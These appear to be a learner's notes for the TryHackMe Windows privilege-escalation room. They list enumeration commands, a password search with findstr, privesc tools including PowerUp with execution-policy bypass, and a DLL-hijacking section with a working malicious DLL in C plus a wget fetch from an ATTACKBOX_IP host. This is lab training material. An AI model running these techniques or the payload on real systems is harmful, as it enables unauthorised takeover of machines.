<!-- TOC -->

- [Windows Privesc](#windows-privesc)
    - [Information Gathering](#information-gathering)
        - [User Enumeration](#user-enumeration)
        - [Collecting system information](#collecting-system-information)
        - [Searching files](#searching-files)
        - [Patch level](#patch-level)
        - [Network Connections](#network-connections)
        - [Scheduled Task](#scheduled-task)
        - [Drivers](#drivers)
        - [Antivirus](#antivirus)
    - [Tools of the trade](#tools-of-the-trade)
        - [WinPEAS](#winpeas)
        - [PowerUp](#powerup)
        - [Windows Exploit Suggester](#windows-exploit-suggester)
        - [Metasploit](#metasploit)
    - [Vulnerable Software](#vulnerable-software)
    - [DLL Hijacking](#dll-hijacking)

<!-- /TOC -->

# Windows Privesc

[Windows Privesc Room](https://tryhackme.com/room/winprivesc)

Learn the fundamentals of Windows privilege escalation. From enumeration to exploitation, get hands-on with privilege escalation techniques seen in the industry today.

## Information Gathering

### User Enumeration

```cmd
whoami /priv
net user
net user <USER>
qwinsta
query session
net localgroup
net localgroup <GROUP>
```

### Collecting system information

```cmd
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
hostname
```

### Searching files

```cmd
findstr /si password *.txt
```

### Patch level

```cmd
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Network Connections

```cmd
netstat -ano
```

### Scheduled Task

```cmd
schtasks
schtasks /query /fo LIST /v
```

### Drivers

```cmd
driverquery
```

### Antivirus

```cmd
sc.exe query windefend
```

## Tools of the trade

### WinPEAS

```cmd
winpeas.exe > outputfile.txt
```

### PowerUp

```cmd
powershell.exe -nop -exec bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

### Windows Exploit Suggester

```cmd
windows-exploit-suggester.py –update
windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo sysinfo_output.txt
```

### Metasploit

```bash
multi/recon/local_exploit_suggester
```

## Vulnerable Software

```cmd
wmic product
wmic product get name,version,vendor
wmic service list brief
wmic service list brief | findstr  "Running"
sc.exe qc <SERVICE>
```

- Searchsploit
- Metasploit
- Exploit-DB
- Github
- Google

## DLL Hijacking

```c
/* windows_dll.c */
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}
```

```bash
x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
```

rhost:

```cmd
wget -O hijackme.dll ATTACKBOX_IP:PORT/hijackme.dll
```


